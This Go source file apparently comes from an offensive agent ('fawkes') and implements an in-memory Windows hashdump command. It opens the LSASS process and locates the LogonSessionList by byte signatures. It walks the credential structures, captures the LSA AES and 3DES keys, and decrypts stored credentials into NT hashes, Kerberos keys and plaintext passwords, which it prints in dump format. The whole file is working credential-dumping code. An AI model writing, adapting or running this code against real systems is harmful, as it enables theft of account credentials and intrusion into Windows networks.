//go:build windows
// +build windows

package commands

// Phase 2B + 2C orchestrator for hashdump in-situ: opens LSASS, walks the
// LogonSessionList, extracts credentials, decrypts with captured LSA keys,
// and emits a structured JSON report with dump-compatible plaintext lines.

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

func layoutForVariant(variant string) logonSessionLayout {
	switch variant {
	case "Win10_1507_Server2016", "Win10_1703", "Win10_1803_Server2019", "Win10_1903_21H1":
		return LayoutWin10Original
	default:
		return LayoutWin10New
	}
}

// lsassRemoteReader implements the cross-platform lsassReader interface
// against a live PROCESS_VM_READ handle.
type lsassRemoteReader struct {
	h windows.Handle
}

func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
	return lsassReadBytes(r.h, addr, size)
}

// executeInsituFull runs the full Phase 2B credential-discovery flow and
// returns a structured CommandResult. The operation runs with a 60-second
// timeout to prevent the agent from hanging if LSASS reads block.
func executeInsituFull() structs.CommandResult {
	type result struct {
		cr structs.CommandResult
	}
	ch := make(chan result, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				ch <- result{cr: errorf("Phase 2B: panic: %v", r)}
			}
		}()
		ch <- result{cr: executeInsituFullInner()}
	}()

	select {
	case r := <-ch:
		return r.cr
	case <-time.After(60 * time.Second):
		return errorf("Phase 2B: operation timed out after 60s (likely hung on ReadProcessMemory)")
	}
}

func executeInsituFullInner() structs.CommandResult {
	phase1, err := enumerateInsituSessions()
	if err != nil {
		return errorf("Phase 1 LSA enumeration failed: %v", err)
	}

	luidIndex := make(map[uint64][]insituSession, len(phase1))
	luidsOrdered := make([]uint64, 0, len(phase1))
	for _, s := range phase1 {
		luid, ok := insituLUIDValue(s)
		if !ok {
			continue
		}
		luidIndex[luid] = append(luidIndex[luid], s)
		luidsOrdered = append(luidsOrdered, luid)
	}

	protection := detectLsassProtection()

	pid, err := lsassFindPID()
	if err != nil {
		return errorf("Phase 2B: locate lsass.exe: %v", err)
	}
	h, err := lsassOpenForRead(pid)
	if err != nil {
		return errorf("Phase 2B: open lsass.exe pid=%d: %v\n[!] Detected protection state: %s\n[!] %s",
			pid, err, protection.Summary(), protection.AccessDeniedHint())
	}
	defer windows.CloseHandle(h)

	mod, err := lsassFindModuleInLsass(pid, "lsasrv.dll")
	if err != nil {
		return errorf("Phase 2B: %v", err)
	}

	lsasrvBytes, err := lsassReadModuleBytes(h, mod)
	if err != nil {
		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
	}

	reader := lsassRemoteReader{h: h}

	anchor, sigVariant, err := findValidatedAnchor(lsasrvBytes, mod.Base, reader)
	if err != nil {
		return errorf("Phase 2B: %v", err)
	}
	cryptoReport, cryptoMaterial, cryptoLayoutName, cryptoErrStr := findBestCryptoLayout(reader, lsasrvBytes, mod.Base)
	canDecrypt := cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey()

	layout := layoutForVariant(sigVariant)
	nodes, walkErr := walkLogonSessionList(reader, anchor, layout.NodeReadSize, 64)

	matchedLUIDs := make(map[uint64]bool, len(luidIndex))
	reports := make([]insituFullNodeReport, 0, len(nodes))
	var matchedNodes, structParsed, nodesWithCreds int
	var credBlobsCaptured, credBlobsDecrypted, hashesExtracted, kerbKeysExtracted, ptCredsExtracted int
	dumpLines := make([]string, 0, 8)
	for _, n := range nodes {
		result := processInsituLogonNode(n, layout, reader, luidIndex, luidsOrdered, matchedLUIDs, canDecrypt, cryptoMaterial)
		if result.structParsed {
			structParsed++
		}
		if result.matched {
			matchedNodes++
		}
		if result.hasCreds {
			nodesWithCreds++
		}
		credBlobsCaptured += result.credBlobsCaptured
		credBlobsDecrypted += result.credBlobsDecrypted
		hashesExtracted += result.hashesExtracted
		kerbKeysExtracted += result.kerbKeysExtracted
		ptCredsExtracted += result.ptCredsExtracted
		dumpLines = append(dumpLines, result.dumpLines...)
		reports = append(reports, result.report)
	}

	var unmatched []string
	for _, luid := range luidsOrdered {
		if !matchedLUIDs[luid] {
			unmatched = append(unmatched, fmt.Sprintf("0x%016X", luid))
		}
	}

	summary := insituFullSummary{
		Phase1SessionCount:       len(phase1),
		LsassProtection:          newProtectionReport(protection),
		LSASSPID:                 pid,
		LsasrvBase:               fmt.Sprintf("0x%X", mod.Base),
		LsasrvSize:               mod.Size,
		AnchorAddr:               fmt.Sprintf("0x%X", anchor),
		StructLayout:             layout.Name,
		CryptoLayout:             cryptoLayoutName,
		PrimaryCredentialLayout:  PrimaryCredential10NewLayout.Name,
		LsaCrypto:                cryptoReport,
		LsaCryptoErr:             cryptoErrStr,
		NodesWalked:              len(nodes),
		NodesMatched:             matchedNodes,
		NodesStructParsed:        structParsed,
		NodesWithCredentials:     nodesWithCreds,
		CredentialBlobsCaptured:  credBlobsCaptured,
		CredentialBlobsDecrypted: credBlobsDecrypted,
		HashesExtracted:          hashesExtracted,
		KerberosKeysExtracted:    kerbKeysExtracted,
		PlaintextCredsExtracted:  ptCredsExtracted,
		UnmatchedLUIDs:           unmatched,
		Nodes:                    reports,
	}

	jsonBytes, err := json.MarshalIndent(summary, "", "  ")
	if err != nil {
		return errorf("Phase 2B: marshal summary: %v", err)
	}

	header := formatInsituFullOutput(phase1, protection, pid, mod, anchor, walkErr, nodes, layout,
		structParsed, matchedLUIDs, luidsOrdered, nodesWithCreds, credBlobsCaptured,
		cryptoErrStr, cryptoReport, hashesExtracted, kerbKeysExtracted, ptCredsExtracted, dumpLines)
	return successResult(header + "\n" + string(jsonBytes))
}

func findBestCryptoLayout(reader lsassReader, lsasrvBytes []byte, modBase uintptr) (*insituFullCryptoReport, lsaCryptoMaterial, string, string) {
	var cryptoReport *insituFullCryptoReport
	var cryptoMaterial lsaCryptoMaterial
	var cryptoLayoutName string
	var cryptoErrs []string
	for _, cl := range lsaCryptoLayouts {
		report, material, errStr := captureLsaCrypto(reader, lsasrvBytes, modBase, cl)
		if material.HasAESKey() || material.HasDESKey() {
			return report, material, cl.Name, ""
		}
		if errStr != "" {
			cryptoErrs = append(cryptoErrs, cl.Name+": "+errStr)
		}
		if report != nil && cryptoReport == nil {
			cryptoReport = report
			cryptoLayoutName = cl.Name
		}
	}
	cryptoErrStr := ""
	if len(cryptoErrs) > 0 {
		cryptoErrStr = strings.Join(cryptoErrs, "; ")
	}
	return cryptoReport, cryptoMaterial, cryptoLayoutName, cryptoErrStr
}

type insituNodeResult struct {
	report             insituFullNodeReport
	structParsed       bool
	matched            bool
	hasCreds           bool
	credBlobsCaptured  int
	credBlobsDecrypted int
	hashesExtracted    int
	kerbKeysExtracted  int
	ptCredsExtracted   int
	dumpLines          []string
}

func processInsituLogonNode(n logonListNode, layout logonSessionLayout, reader lsassReader,
	luidIndex map[uint64][]insituSession, luidsOrdered []uint64, matchedLUIDs map[uint64]bool,
	canDecrypt bool, cryptoMaterial lsaCryptoMaterial) insituNodeResult {
	preview := 64
	if len(n.Raw) < preview {
		preview = len(n.Raw)
	}
	report := insituFullNodeReport{
		Address:       fmt.Sprintf("0x%X", n.Address),
		Flink:         fmt.Sprintf("0x%X", n.Flink),
		Blink:         fmt.Sprintf("0x%X", n.Blink),
		RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
	}
	parsed := parseLogonSessionFields(reader, n.Raw, layout)
	var result insituNodeResult
	if parsed.LUID != 0 {
		result.structParsed = true
		report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
	}
	report.ParsedUserName = parsed.UserName
	report.ParsedDomain = parsed.Domain
	report.ParsedAuthPkg = parsed.AuthPackage
	report.ParsedLogonSrv = parsed.LogonServer
	if name := logonSessionTypeName(parsed.LogonType); name != "" {
		report.ParsedLogonType = name
	}
	if parsed.CredentialsPtr != 0 {
		report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
	}
	report.ParseErrors = parsed.ParseErrors

	if parsed.LUID != 0 {
		if _, ok := luidIndex[parsed.LUID]; ok {
			matchedLUIDs[parsed.LUID] = true
			report.Phase1Match = true
			report.Phase1Source = "structured"
			for _, sess := range luidIndex[parsed.LUID] {
				report.MatchedUsers = append(report.MatchedUsers,
					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
			}
		}
	}
	if !report.Phase1Match {
		for _, luid := range luidsOrdered {
			if !scanRawForLUID(n.Raw, luid) {
				continue
			}
			matchedLUIDs[luid] = true
			report.Phase1Match = true
			report.Phase1Source = "byte-scan-fallback"
			for _, sess := range luidIndex[luid] {
				report.MatchedUsers = append(report.MatchedUsers,
					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
			}
			break
		}
	}
	result.matched = report.Phase1Match

	if parsed.CredentialsPtr != 0 {
		creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
		if walkErr != nil {
			report.CredentialWalkErr = walkErr.Error()
		}
		if len(creds) > 0 {
			result.hasCreds = true
			report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
			sessionUser := parsed.UserName
			if sessionUser == "" && len(report.MatchedUsers) > 0 {
				for _, sess := range luidIndex[parsed.LUID] {
					if sess.Username != "" {
						sessionUser = sess.Username
						break
					}
				}
			}
			for _, c := range creds {
				credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser,
					&result.credBlobsCaptured, &result.credBlobsDecrypted, &result.hashesExtracted,
					&result.kerbKeysExtracted, &result.ptCredsExtracted, &result.dumpLines)
				report.Credentials = append(report.Credentials, credReport)
			}
		}
	}

	result.report = report
	return result
}

// buildCredentialReport constructs a single credential report entry, performing
// decryption if key material is available. sessionUser is the logon session's
// username (from Phase 2C-i), used for dump line generation since the
// PRIMARY_CREDENTIALS envelope's Primary field is the auth package name, not
// the user's login name. Counters are updated in-place.
func buildCredentialReport(c credentialListEntry, canDecrypt bool, material lsaCryptoMaterial,
	sessionUser string, blobsCaptured, blobsDecrypted, hashes, kerbKeys, ptCreds *int,
	dumpLines *[]string) insituFullCredentialReport {
	credReport := insituFullCredentialReport{
		Address:       fmt.Sprintf("0x%X", c.Address),
		AuthPackageId: c.AuthPackageId,
		AuthPackage:   c.AuthPackageName,
		RawHex:        c.RawHex,
	}
	if c.PrimaryCredentialsDataPtr != 0 {
		credReport.PrimaryCredsAddr = fmt.Sprintf("0x%X", c.PrimaryCredentialsDataPtr)
	}
	if c.PrimaryReadErr != "" {
		credReport.PrimaryReadErr = c.PrimaryReadErr
	}
	if c.Primary != nil {
		credReport.ParsedUserName = c.Primary.UserName
		credReport.ParsedDomain = c.Primary.Domain
		if c.Primary.EncryptedAddress != 0 {
			credReport.EncryptedAddress = fmt.Sprintf("0x%X", c.Primary.EncryptedAddress)
		}
		credReport.EncryptedLength = c.Primary.EncryptedLength
		if len(c.Primary.EncryptedBytes) > 0 {
			previewLen := len(c.Primary.EncryptedBytes)
			if previewLen > 64 {
				previewLen = 64
			}
			credReport.EncryptedHexPreview = hex.EncodeToString(c.Primary.EncryptedBytes[:previewLen])
			*blobsCaptured++

			if canDecrypt {
				credName := c.Primary.UserName
				dec, line := decryptCredentialBlob(material, c.Primary.EncryptedBytes, sessionUser,
					credName, c.Primary.EncryptedAddress)
				credReport.Decrypted = dec
				if dec != nil && dec.ParseErr != "" {
					credReport.DecryptErr = dec.ParseErr
				}
				if dec != nil && dec.NtHashHex != "" {
					*blobsDecrypted++
					*hashes++
				}
				if dec != nil && len(dec.KerberosKeys) > 0 {
					*kerbKeys += len(dec.KerberosKeys)
				}
				if dec != nil && dec.PlaintextPassword != "" {
					*ptCreds++
				}
				if line != "" {
					*dumpLines = append(*dumpLines, line)
				}
			}
		}
		credReport.ParseErrors = c.Primary.ParseErrors
	}

	// Process additional entries in the PRIMARY_CREDENTIALS chain.
	if len(c.PrimaryEntries) > 1 && canDecrypt {
		for _, pe := range c.PrimaryEntries[1:] {
			entryReport := insituFullPrimaryCredEntryReport{
				CredentialName: pe.UserName,
			}
			if pe.EncryptedAddress != 0 {
				entryReport.EncryptedAddress = fmt.Sprintf("0x%X", pe.EncryptedAddress)
			}
			entryReport.EncryptedLength = pe.EncryptedLength
			if len(pe.EncryptedBytes) > 0 {
				*blobsCaptured++
				dec, line := decryptCredentialBlob(material, pe.EncryptedBytes, sessionUser,
					pe.UserName, pe.EncryptedAddress)
				entryReport.Decrypted = dec
				if dec != nil && dec.ParseErr != "" {
					entryReport.DecryptErr = dec.ParseErr
				}
				if dec != nil && dec.NtHashHex != "" {
					*blobsDecrypted++
					*hashes++
				}
				if dec != nil && len(dec.KerberosKeys) > 0 {
					*kerbKeys += len(dec.KerberosKeys)
				}
				if dec != nil && dec.PlaintextPassword != "" {
					*ptCreds++
				}
				if line != "" {
					*dumpLines = append(*dumpLines, line)
				}
			}
			credReport.AdditionalEntries = append(credReport.AdditionalEntries, entryReport)
		}
	}
	return credReport
}

// formatInsituFullOutput builds the human-readable header for the insitu-full
// result.
func formatInsituFullOutput(phase1 []insituSession, protection LsassProtectionState,
	pid uint32, mod lsassRemoteModule, anchor uintptr, walkErr error,
	nodes []logonListNode, layout logonSessionLayout,
	structParsed int, matchedLUIDs map[uint64]bool, luidsOrdered []uint64,
	nodesWithCreds, credBlobsCaptured int,
	cryptoErrStr string, cryptoReport *insituFullCryptoReport,
	hashesExtracted, kerbKeysExtracted, ptCredsExtracted int, dumpLines []string) string {

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
	sb.WriteString(fmt.Sprintf("[+] LSASS protection: %s\n", protection.Summary()))
	sb.WriteString(fmt.Sprintf("[+] LSASS pid=%d, lsasrv.dll @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
	sb.WriteString(fmt.Sprintf("[+] LogonSessionList anchor: 0x%X\n", anchor))
	if walkErr != nil {
		sb.WriteString(fmt.Sprintf("[!] Walk terminated early: %v (collected %d node(s))\n", walkErr, len(nodes)))
	} else {
		sb.WriteString(fmt.Sprintf("[+] Walked %d node(s) cleanly\n", len(nodes)))
	}
	sb.WriteString(fmt.Sprintf("[+] Layout: %s — %d/%d node(s) yielded a non-zero structured LUID\n", layout.Name, structParsed, len(nodes)))
	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n", len(matchedLUIDs), len(luidsOrdered)))
	sb.WriteString(fmt.Sprintf("[+] Credential lists: %d node(s) yielded credential entries; %d encrypted blob(s) captured (Phase 2C-ii-a)\n", nodesWithCreds, credBlobsCaptured))
	if cryptoErrStr != "" {
		sb.WriteString(fmt.Sprintf("[!] LSA crypto extraction failed: %s\n", cryptoErrStr))
	} else if cryptoReport != nil {
		sb.WriteString(fmt.Sprintf("[+] LSA crypto: IV @ %s; h3DesKey @ %s (cb=%d); hAesKey @ %s (cb=%d) — Phase 2C-ii-b\n",
			cryptoReport.IVAddress,
			cryptoReport.H3DesGlobal, bcryptCbSecret(cryptoReport.H3DesKey),
			cryptoReport.HAesGlobal, bcryptCbSecret(cryptoReport.HAesKey)))
	}
	sb.WriteString(fmt.Sprintf("[+] Decryption: %d NT hash(es), %d Kerberos key(s), %d plaintext credential(s)\n",
		hashesExtracted, kerbKeysExtracted, ptCredsExtracted))

	if len(dumpLines) > 0 {
		sb.WriteString("\n")
		for _, line := range dumpLines {
			sb.WriteString(line)
			sb.WriteString("\n")
		}
	}
	return sb.String()
}

// bcryptCbSecret returns the resolved cbSecret of a BCrypt key report or 0
// when the report wasn't captured.
func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
	if r == nil {
		return 0
	}
	return r.CbSecret
}

// findValidatedAnchor tries each LogonSessionList signature variant, resolves
// the candidate anchor address, then validates it by reading the LIST_ENTRY
// from LSASS and checking that the pointers look reasonable. This prevents
// false-positive pattern matches from producing bad anchors that hang the walk.
func findValidatedAnchor(lsasrvBytes []byte, lsasrvBase uintptr, reader lsassReader) (uintptr, string, error) {
	var diag []string
	for _, v := range logonSessionListVariants {
		pat, mask, err := parseHexPattern(v.Signature)
		if err != nil {
			diag = append(diag, fmt.Sprintf("%s: bad pattern: %v", v.Name, err))
			continue
		}
		hit := findPattern(lsasrvBytes, pat, mask)
		if hit < 0 {
			continue
		}
		movStart := hit + v.MovInstrOffset
		if movStart < 0 || movStart+v.MovInstrLen > len(lsasrvBytes) {
			diag = append(diag, fmt.Sprintf("%s: MOV outside buffer", v.Name))
			continue
		}
		target, _, ok := resolveRIPRelative(lsasrvBytes, movStart, v.MovDispFieldOffs, v.MovInstrLen)
		if !ok {
			diag = append(diag, fmt.Sprintf("%s: RIP target outside buffer", v.Name))
			continue
		}
		candidate := lsasrvBase + uintptr(target)

		head, err := readListEntry(reader, candidate)
		if err != nil {
			diag = append(diag, fmt.Sprintf("%s: anchor 0x%X unreadable: %v", v.Name, candidate, err))
			continue
		}
		if !isPlausibleUserModePtr(head.Flink) || !isPlausibleUserModePtr(head.Blink) {
			diag = append(diag, fmt.Sprintf("%s: anchor 0x%X has bad pointers (Flink=0x%X Blink=0x%X)", v.Name, candidate, head.Flink, head.Blink))
			continue
		}
		return candidate, v.Name, nil
	}
	return 0, "", fmt.Errorf("LogonSessionList: no variant produced a valid anchor in %d-byte lsasrv.dll (%d variants tried); diagnostics: %s",
		len(lsasrvBytes), len(logonSessionListVariants), strings.Join(diag, "; "))
}

func isPlausibleUserModePtr(addr uintptr) bool {
	return addr >= 0x10000 && addr < 0x7FFFFFFFFFFF
}
